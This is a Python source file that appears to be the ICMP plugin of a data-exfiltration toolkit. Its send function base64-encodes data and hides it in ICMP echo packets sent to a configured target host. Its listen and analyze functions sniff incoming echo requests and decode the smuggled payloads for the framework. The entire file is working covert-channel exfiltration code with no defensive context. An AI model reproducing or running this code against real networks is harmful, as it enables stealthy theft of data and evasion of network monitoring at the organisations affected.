import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy import all as scapy
import base64

config = None
app_exfiltrate = None


def send(data):
    data = base64.b64encode(data)
    app_exfiltrate.log_message(
        'info', "[icmp] Sending {} bytes with ICMP packet".format(len(data)))
    scapy.sendp(scapy.Ether() /
                scapy.IP(dst=config['target']) / scapy.ICMP() / data, verbose=0)


def listen():
    app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
    # Filter for echo requests only to prevent capturing generated replies
    scapy.sniff(filter="icmp and icmp[0]=8", prn=analyze)


def analyze(packet):
    src = packet.payload.src
    dst = packet.payload.dst
    try:
        app_exfiltrate.log_message(
            'info', "[icmp] Received ICMP packet from: {0} to {1}".format(src, dst))
        app_exfiltrate.retrieve_data(base64.b64decode(packet.load))
    except:
        pass


class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        app_exfiltrate = app
        config = conf
        app.register_plugin('icmp', {'send': send, 'listen': listen})
